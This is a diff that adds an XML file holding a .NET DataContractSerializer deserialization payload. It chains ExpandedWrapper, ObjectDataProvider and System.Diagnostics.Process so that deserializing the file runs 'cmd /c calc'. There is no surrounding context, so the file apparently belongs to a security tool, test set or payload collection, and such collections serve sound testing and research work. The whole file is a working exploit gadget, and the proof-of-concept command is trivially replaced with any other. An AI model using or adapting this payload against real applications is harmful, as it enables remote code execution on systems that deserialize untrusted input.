@@ -1,0 +1,20 @@
+<?xml version="1.0"?>
+<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns="http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"
+                                                         xmlns:c="http://www.w3.org/2001/XMLSchema"
+                                                         xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
+                                                         xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/"
+                                                         >
+      <ExpandedElement z:Id="ref1" >
+        <__identity i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System"/>
+      </ExpandedElement>
+      <ProjectedProperty0 xmlns:a="http://schemas.datacontract.org/2004/07/System.Windows.Data">
+        <a:MethodName>Start</a:MethodName>
+        <a:MethodParameters xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+          <b:anyType i:type="c:string">cmd</b:anyType>
+          <b:anyType i:type="c:string">/c calc</b:anyType>
+        </a:MethodParameters>
+        <a:ObjectInstance z:Ref="ref1"/>
+      </ProjectedProperty0>
+    </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
+</root>
